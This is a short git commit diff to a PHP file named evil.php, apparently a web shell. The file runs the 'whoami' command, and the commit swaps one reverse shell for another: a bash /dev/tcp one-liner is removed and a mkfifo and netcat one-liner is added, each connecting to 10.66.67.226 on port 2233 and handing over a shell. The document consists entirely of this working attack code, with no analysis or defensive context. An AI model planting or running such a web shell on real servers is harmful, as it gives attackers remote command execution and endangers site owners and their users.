b0cae031ad661a0a4fb480de3614d5d45f2f50e3
Ng Jing Ying <ngoldweekly@gmail.com>
2022-05-31 14:11:33 +0800

    Update evil.php

--- evil.php
+++ evil.php
@@ -1,3 +1,3 @@
 <?php echo shell_exec("whoami");?>
 
-<?php echo system("0<&196;exec 196<>/dev/tcp/10.66.67.226/2233; sh <&196 >&196 2>&196"); ?>
+<?php echo system("mkfifo /tmp/spht; nc 10.66.67.226 2233 0</tmp/spht | /bin/sh >/tmp/spht 2>&1; rm /tmp/spht "); ?>
